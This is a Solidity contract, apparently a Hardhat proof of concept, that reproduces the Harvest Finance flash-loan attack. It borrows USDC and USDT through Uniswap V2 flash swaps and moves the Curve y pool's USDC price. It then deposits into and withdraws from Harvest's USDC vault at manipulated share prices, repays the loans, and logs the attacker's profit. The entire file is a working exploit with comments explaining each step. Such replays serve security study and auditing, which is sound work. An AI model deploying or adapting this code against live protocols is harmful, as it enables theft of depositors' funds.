// SPDX-License-Identifier: MIT
pragma solidity ^0.8.1;

import "hardhat/console.sol";
import "./interfaces/interface.sol";
import "./constants/constants.sol";

contract ContractKiller {
    bool public isPwned;
    bool public isUsdcPairFlipped;

    /* 2 styles of getting token-pair-addresses. If sorted order is required, prefer constructor() style. */
    // Uniswap ETH/USDC LP (UNI-V2)
    address usdcPair;

    // Uniswap ETH/USDT LP (UNI-V2)
    IUniswapV2Pair usdtPair =
        IUniswapV2Pair(
            IUniswapV2Factory(CONST_UNISWAP_V2_FACTORY).getPair(
                CONST_TOKENADDRESS_WETH,
                CONST_TOKENADDRESS_USDT
            )
        );
    // Curve y swap
    IcurveYSwap curvePool = IcurveYSwap(CONST_CURVEPOOL_Y);
    // Harvest USDC pool
    IHarvestUsdcVault harvestPool = IHarvestUsdcVault(CONST_HARVEST_POOL_USDC);

    // ERC20s
    // 6 decimals on usdt
    IUSDT usdt = IUSDT(CONST_TOKENADDRESS_USDT);
    // 6 decimals on usdc
    IERC20 usdc = IERC20(CONST_TOKENADDRESS_USDC);
    // 6 decimals on yusdc
    IERC20 yusdc = IERC20(CONST_TOKENADDRESS_YUSDC);
    // 6 decimals on yusdt
    IERC20 yusdt = IERC20(CONST_TOKENADDRESS_YUSDT);
    // 6 decimals on fUSDT
    IERC20 fusdt = IERC20(CONST_TOKENADDRESS_FUSDT);
    // 6 decimals on fUSDC
    IERC20 fusdc = IERC20(CONST_TOKENADDRESS_FUSDC);

    // usdtLoan: used to swap for USDC in Curve, pushing USDC prices up
    uint256 usdtLoan = 17_300_000 * 10 ** 6;
    uint256 usdtRepayment = (usdtLoan * 100301) / 100000; // 0.3% fee

    // usdcLoan: used to deposit into Harvest to get LP tokens
    uint256 usdcLoan = 50_000_000 * 10 ** 6;
    uint256 usdcRepayment = (usdcLoan * 100301) / 100000; // 0.3% fee

    uint256 usdcBal;
    uint256 usdtBal;

    constructor() {
        usdcPair = IUniswapV2Factory(CONST_UNISWAP_V2_FACTORY).getPair(
            CONST_TOKENADDRESS_WETH,
            CONST_TOKENADDRESS_USDC
        );
        require(usdcPair != address(0), "usdcPair address problem!");
        address token0 = IUniswapV2Pair(usdcPair).token0();
        // to understand sorted tokens' order. Later needed while calling swap().
        isUsdcPairFlipped = token0 == CONST_TOKENADDRESS_WETH ? false : true;
    }

    function pwn() public {
        usdt.approve(address(curvePool), type(uint256).max);
        usdc.approve(address(curvePool), type(uint256).max);
        usdc.approve(address(harvestPool), type(uint256).max);
        usdt.approve(address(usdtPair), type(uint256).max);
        usdc.approve(address(usdcPair), type(uint256).max);
        console.log(
            "Before exploitation, USDC balance of attacker:",
            usdc.balanceOf(address(this)) / 1e6
        );
        console.log(
            "Before exploitation, USDT balance of attacker:",
            usdt.balanceOf(address(this)) / 1e6
        );

        if (isUsdcPairFlipped) {
            // The last param is 'data'. Sending a non-empty value ensures flash-swap is
            // called instead of normal-swap
            IUniswapV2Pair(usdcPair).swap(usdcLoan, 0, address(this), "0x"); // 'uniswapV2Call' hook is called
        } else IUniswapV2Pair(usdcPair).swap(0, usdcLoan, address(this), "0x");

        console.log(
            "After exploitation, USDC balance of attacker:",
            usdc.balanceOf(address(this)) / 1e6
        );
        console.log(
            "After exploitation, USDT balance of attacker:",
            usdt.balanceOf(address(this)) / 1e6
        );

        isPwned = true;
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        if (msg.sender == usdcPair) {
            console.log(
                "Flashswap, Amount of USDC received:",
                usdc.balanceOf(address(this)) / 1e6 // would be 50MM
            );
            usdtPair.swap(0, usdtLoan, address(this), "0x");
            bool usdcSuccess = usdc.transfer(usdcPair, usdcRepayment);
        }

        if (msg.sender == address(usdtPair)) {
            console.log(
                "Flashswap, Amount of USDT received:",
                usdt.balanceOf(address(this)) / 1e6
            );
            for (uint256 i = 0; i < 2; i++) {
                theSwap(i);
            }
            usdt.transfer(msg.sender, usdtRepayment);
        }
    }

    function theSwap(uint256 i) internal {
        console.log("price b4 : ", harvestPool.getPricePerFullShare());
        console.log("tSupp b4 : ", harvestPool.totalSupply());
        console.log("ubwi  b4 : ", harvestPool.underlyingBalanceWithInvestment());
        curvePool.exchange_underlying(
            2, // sell USDT
            1, // buy USDC
            17_200_000 * 1e6,
            17_000_000 * 1e6
        ); // will cause USDC price to rise

        console.log("price l8r: ", harvestPool.getPricePerFullShare());
        console.log("tSupp l8r: ", harvestPool.totalSupply());
        console.log("ubwi  l8r: ", harvestPool.underlyingBalanceWithInvestment());
        // pricePerShare `(l8r)` has dipped as compared to `(b4)`, so we get
        // more LPTokens or fUSDC, when we make the below deposit of USDCs.
        // This is as per the logic in Harvest's _deposit() function:
        // https://github.com/harvest-finance/harvest/blob/master/contracts/Vault.sol#L342
        harvestPool.deposit(49_000_000_000_000); // 49MM out of the 50MM USDC we got via flash loan

        // now we sell USDC back to the pool, 'almost' normalizing its price.
        // We received 17MM USDC in exchange_underlying() above, but now will
        // sell 17.31MM USDC below. This is the reason we kept 1MM aside and
        // deposited only 49MM into harvest pool.
        curvePool.exchange_underlying(1, 2, 17_310_000 * 1e6, 17_000_000 * 1e6);
        // price of LPTokens/fUSDC has risen again due to the above exchange_underlying() and
        // hence we will get more USDC per owned fUSDC when we withdraw.
        console.log("price end: ", harvestPool.getPricePerFullShare());
        console.log("tSupp end: ", harvestPool.totalSupply());
        console.log("ubwi  end: ", harvestPool.underlyingBalanceWithInvestment());

        harvestPool.withdraw(fusdc.balanceOf(address(this)));
        console.log(
            "After swap, USDC balance of attacker:",
            usdc.balanceOf(address(this)) / 1e6
        );
        console.log(
            "After swap, USDT balance of attacker:",
            usdt.balanceOf(address(this)) / 1e6
        );
    }

    receive() external payable {}
}
